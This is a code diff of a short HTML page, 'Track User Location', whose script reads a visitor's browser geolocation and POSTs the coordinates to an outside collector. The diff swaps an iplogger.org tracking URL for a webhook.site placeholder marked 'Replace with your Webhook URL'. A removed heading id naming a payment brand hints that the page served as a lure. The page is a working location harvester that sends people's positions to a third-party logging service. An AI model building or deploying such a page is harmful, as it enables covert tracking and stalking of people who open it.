@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Track Location</title>
-    <!-- Add Favicon (Optional) -->
     <script>
         function getLocation() {
             if (navigator.geolocation) {
@@ -18,17 +17,16 @@
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
 
-            // Send location and IP to your IP Logger
-            fetch("https://iplogger.org/logger/gm5M4UdEkXyJ", { 
-    method: "POST",
-    headers: {
-        "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-        latitude: latitude,
-        longitude: longitude
-    })
-})
+            // Send location and IP to Webhook.site
+            fetch("https://webhook.site/123abc-unique-url", { // Replace with your Webhook URL
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    latitude: latitude,
+                    longitude: longitude
+                })
             }).then(response => {
                 alert(`Location Sent! Latitude: ${latitude}, Longitude: ${longitude}`);
             }).catch(error => {
@@ -55,7 +53,7 @@
     </script>
 </head>
 <body>
-    <h1 id="easypaisa">Track User Location</h1>
+    <h1>Track User Location</h1>
     <button onclick="getLocation()" style="padding: 10px 20px; font-size: 16px; background-color: blue; color: white; border: none; cursor: pointer;">Get Location</button>
 </body>
 </html>
